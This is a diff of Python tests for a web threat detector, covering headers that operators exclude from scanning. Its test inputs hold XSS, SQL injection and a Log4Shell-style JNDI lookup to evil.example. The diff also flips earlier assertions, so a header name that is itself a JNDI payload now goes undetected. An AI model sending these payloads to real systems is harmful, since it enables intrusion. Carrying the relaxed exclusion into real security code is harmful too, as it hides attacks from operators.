@@ -86,14 +86,16 @@ class _FakeRequest:
         return self._body_bytes
 
 
-async def test_excluded_header_generic_name_still_detects_non_address_categories() -> (
-    None
-):
+async def test_operator_excluded_header_is_not_scanned_in_any_category() -> None:
     config = SecurityConfig(excluded_detection_headers={"x-raw"})
-    request = _FakeRequest(headers={"x-raw": "<script>alert(1)</script>"})
-    _result = await detect_penetration_attempt(request, config)
-    detected = _result.is_threat
-    assert detected is True
+    for value in (
+        "<script>alert(1)</script>",
+        "' UNION SELECT password FROM users--",
+        "${jndi:ldap://evil.example/a}",
+    ):
+        request = _FakeRequest(headers={"x-raw": value})
+        _result = await detect_penetration_attempt(request, config)
+        assert _result.is_threat is False
 
 
 async def test_excluded_header_address_value_suppresses_ssrf_only() -> None:
@@ -525,13 +527,12 @@ async def test_excluded_header_all_enabled_categories_excluded_skips_scan() -> N
     assert detected is False
 
 
-async def test_excluded_header_malicious_name_detected_via_shield() -> None:
+async def test_operator_excluded_header_name_is_skipped_with_its_value() -> None:
     malicious_name = "${jndi:ldap://evil.example/a}"
     config = SecurityConfig(excluded_detection_headers={malicious_name})
     request = _FakeRequest(headers={malicious_name: "benign"})
     _result = await detect_penetration_attempt(request, config)
-    detected = _result.is_threat
-    assert detected is True
+    assert _result.is_threat is False
 
 
 async def test_sensitive_query_param_value_threat_is_logged_redacted() -> None:
